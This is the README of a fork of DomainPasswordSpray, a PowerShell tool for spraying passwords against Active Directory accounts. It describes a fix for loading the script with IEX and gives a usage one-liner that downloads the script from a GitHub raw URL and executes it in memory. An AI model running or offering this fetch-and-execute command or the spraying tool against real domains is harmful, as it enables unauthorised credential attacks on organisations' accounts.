# DomainPasswordSpray - Changes
This is a fork, the original can be found [here](https://github.com/dafthack/DomainPasswordSpray)

The original script threw an error when being IEX-ed. This fork fixes that error. 

The script still displays errors when `Invoke-DomainPasswordSpray` is called, however it does work.

## Usage

```powershell
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/notb9/DomainPasswordSpray/master/DomainPasswordSpray.ps1")
```
## ToDo

  - [ ] Fix the runtime errors
